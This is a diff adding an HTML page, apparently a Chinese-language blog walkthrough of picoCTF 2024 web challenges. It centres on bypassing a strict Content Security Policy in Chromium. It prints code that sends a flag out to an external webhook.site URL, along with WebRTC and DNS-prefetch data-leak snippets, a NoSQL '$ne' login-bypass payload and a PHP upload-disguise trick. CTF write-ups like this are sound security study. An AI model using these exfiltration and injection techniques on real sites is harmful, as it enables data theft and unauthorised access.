@@ -1,0 +1,293 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>PicoCTF2024 WEB WP | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="PicoCTF2024 WEB WP | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="这篇文章目的是记住elements这道题，其他就是水！
+elements
+WP参考：https://github.com/satoki/ctf_writeups/tree/master/picoCTF_2024/elements
+这题考的是..." />
+    <meta name="keywords" content="CSP,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              PicoCTF2024 WEB WP
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-04-01
+              </span>
+              <span>
+                4 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/D62OSlY-X/" class="post-tag">
+                  # CSP
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/picoctf2024-web-wp.jpg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>这篇文章目的是记住elements这道题，其他就是水！</p>
+<h1 id="elements">elements</h1>
+<p>WP参考：<a href="https://github.com/satoki/ctf_writeups/tree/master/picoCTF_2024/elements">https://github.com/satoki/ctf_writeups/tree/master/picoCTF_2024/elements</a></p>
+<p>这题考的是在一个有很多限制条件下，如何用js的eval执行代码向外部发送一条请求。</p>
+<p><strong>限制：CSP</strong></p>
+<p>CSP背景：<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP</a></p>
+<p>CSP绕过：<a href="https://book.hacktricks.xyz/v/cn/pentesting-web/content-security-policy-csp-bypass">https://book.hacktricks.xyz/v/cn/pentesting-web/content-security-policy-csp-bypass</a></p>
+<pre><code class="language-javascript">const csp =  [
+  &quot;default-src 'none'&quot;,
+  &quot;style-src 'unsafe-inline'&quot;,
+  &quot;script-src 'unsafe-eval' 'self'&quot;,
+  &quot;frame-ancestors 'none'&quot;,
+  &quot;worker-src 'none'&quot;,
+  &quot;navigate-to 'none'&quot;
+]
+</code></pre>
+<p>其实default-src 'none'就拦了一大堆东西了，我比较好奇的是：</p>
+<ul>
+<li>为什么使用<code>location.herf</code>和<code>window.herf</code>没用</li>
+<li><code>navigate-to 'none'</code>这个我看限制了<code>window.open</code>，<code>window.herf</code>还有<code>form</code>表单提交但我在用自己浏览器做实验的时候，这条规则并没有起效果。</li>
+<li>还有也不能用<code>meta</code>标签的<code>refresh</code>跳转</li>
+</ul>
+<p>这些疑惑大概率会在我Windows的kali虚拟机上安装好题目给的Chromium浏览器得到解决，不过有空再说吧～</p>
+<p>(Ps.关于之前PearlCTF那道Learn HTTP，原来在Chromium里面script-src 'self'就是不能让js直接在页面上执行😂<br>
+<img src="https://skyblu3519.github.io/post-images/picoctf2024/1711983025946-14262a49-b433-4d27-98f2-2ae2db2098b3.png" alt="image.png" loading="lazy"></p>
+<p><strong>限制：WebRTC</strong></p>
+<p>题目给的diff文件给出信息：RTCPeerConnection 和 webkitRTCPeerConnection 不可用。</p>
+<pre><code class="language-diff">diff --git a/third_party/blink/renderer/modules/peerconnection/rtc_peer_connection.idl b/third_party/blink/renderer/modules/peerconnection/rtc_peer_connection.idl
+index f0948629cb..393e7c77e0 100644
+--- a/third_party/blink/renderer/modules/peerconnection/rtc_peer_connection.idl
++++ b/third_party/blink/renderer/modules/peerconnection/rtc_peer_connection.idl
+@@ -61,10 +61,7 @@ enum RTCPeerConnectionState {
+ // https://w3c.github.io/webrtc-pc/#interface-definition
+
+ [
+-    ActiveScriptWrappable,
+-    Exposed=Window,
+-    LegacyWindowAlias=webkitRTCPeerConnection,
+-    LegacyWindowAlias_Measure
++    ActiveScriptWrappable
+ ] interface RTCPeerConnection : EventTarget {
+     // TODO(https://crbug.com/1318448): Deprecated `mediaConstraints` should be removed.
+     [CallWith=ExecutionContext, RaisesException] constructor(optional RTCConfiguration configuration = {}, optional GoogMediaConstraints mediaConstraints);
+</code></pre>
+<p>借着机会了解下WebRTC，可以用下面的代码发起一次DNS解析（类似DNS Prefetch）</p>
+<pre><code class="language-javascript">(async () =&gt; { p = new RTCPeerConnection({ iceServers: [{ urls: &quot;stun:LEAK.dnsbin&quot; }] }); p.createDataChannel(''); p.setLocalDescription(await p.createOffer()) })()
+</code></pre>
+<p><strong>限制：DNS Prefetch</strong></p>
+<p>限制的方法用的是这段代码</p>
+<pre><code class="language-javascript">	const userDataDir = await mkdtemp(join(tmpdir(), 'elements-'));
+
+	await mkdir(join(userDataDir, 'Default'));
+	await writeFile(join(userDataDir, 'Default', 'Preferences'), JSON.stringify({
+		net: {
+			network_prediction_options: 2
+		}
+	}));
+</code></pre>
+<p>利用DNS Prefetch的代码</p>
+<pre><code class="language-javascript">const linkEl = document.createElement('link');
+linkEl.rel = 'dns-prefetch';
+linkEl.href = urlWithYourPreciousData;
+document.head.appendChild(linkEl);
+</code></pre>
+<p>总之，限制了一大推最后关注到的是，发起请求时Chromium的启动参数：<code>--enable-experimental-web-platform-features</code></p>
+<p>这个允许Chromium具有一些实验特性，而查看最近的版本信息，发现了<code>PendingGetBeacon</code>这个API，最后执行一个这样的代码即可</p>
+<pre><code class="language-python">myhook = &quot;https://webhook.site/820aeb64-ea79-49de-9ca6-93ce0566a985/${state.flag.slice(0, -1)}&quot;
+xss = f&quot;beacon = new PendingGetBeacon(`{myhook}`, {{timeout: 1000}});&quot;
+</code></pre>
+<h1 id="bookmarklet">Bookmarklet</h1>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/picoctf2024/1710300377020-326bcdbe-59d5-4ad5-a36d-80f126c716f5.png" alt="image.png" loading="lazy"></figure>
+<h1 id="webdecode">WebDecode</h1>
+<ul>
+<li>进入<code>/about.html</code></li>
+<li>F12</li>
+<li>发现base64编码内容</li>
+<li>解码</li>
+</ul>
+<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/picoctf2024/1710300924097-dd8db8f3-a850-45cd-b42f-4c3592dbe1dc.png" alt="image.png" loading="lazy"></figure>
+<h1 id="no-sql-injection">No Sql Injection</h1>
+<ul>
+<li>flag在表中的token字段</li>
+<li>构造查询条件时，如果password和email是json格式会将其解析</li>
+<li>NoSQL注入一个永真查询：User.find({'email':{<span class='katex-error' title='ParseError: KaTeX parse error: Expected &#039;EOF&#039;, got &#039;}&#039; at position 5: ne:1}̲, &#039;password&#039;:{'>ne:1}, &#039;password&#039;:{</span>ne:1}})</li>
+<li>payload构造</li>
+</ul>
+<pre><code class="language-json">{&quot;email&quot;:&quot;{\&quot;$ne\&quot;:\&quot;1\&quot;}&quot;,&quot;password&quot;:&quot;{\&quot;$ne\&quot;:\&quot;1\&quot;}&quot;}
+</code></pre>
+<p><img src="https://skyblu3519.github.io/post-images/picoctf2024/1710304495872-5baed08f-c509-4097-9716-9eadcb92651f.png" alt="image.png" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/picoctf2024/1710304595808-8180f2a0-e765-4e59-bf23-0ca004437f42.png" alt="image.png" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/picoctf2024/1710304831564-cb2e7404-a51e-4842-b592-8fd2d62e3ccf.png" alt="image.png" loading="lazy"></p>
+<h1 id="trickster">Trickster</h1>
+<ul>
+<li>文件后缀检查使用<code>.png.php</code>，内容部分添加png文件头</li>
+<li>上传命令执行代码</li>
+<li>flag在../HFQWKODGMIYTO.txt</li>
+</ul>
+<p><img src="https://skyblu3519.github.io/post-images/picoctf2024/1710308204536-ae8b31d5-ee0d-4bf7-a9f3-d057b5236821.png" alt="image.png" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/picoctf2024/1710308223028-908954e5-bc25-4332-a972-7e98f15b1c63.png" alt="image.png" loading="lazy"></p>
+<h1 id="introtoburp">IntroToBurp</h1>
+<ul>
+<li>破坏<code>/dashboard</code>提交otp参数即可让认证错误</li>
+</ul>
+<figure data-type="image" tabindex="3"><img src="https://skyblu3519.github.io/post-images/picoctf2024/1710308818580-20696bf3-5ba1-428a-b56f-c2c4cf2ee3be.png" alt="image.png" loading="lazy"></figure>
+<h1 id="unminify">Unminify</h1>
+<p>F12<br>
+<img src="https://skyblu3519.github.io/post-images/picoctf2024/1710308951833-e3a51ebf-c751-465e-99cf-14ee294eb911.png" alt="image.png" loading="lazy"></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#elements">elements</a></li>
+<li><a href="#bookmarklet">Bookmarklet</a></li>
+<li><a href="#webdecode">WebDecode</a></li>
+<li><a href="#no-sql-injection">No Sql Injection</a></li>
+<li><a href="#trickster">Trickster</a></li>
+<li><a href="#introtoburp">IntroToBurp</a></li>
+<li><a href="#unminify">Unminify</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/webrtc-ru-he-huo-qu-yong-hu-zhen-shi-ip/">
+              <h3 class="post-title">
+                WebRTC如何获取用户真实IP
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
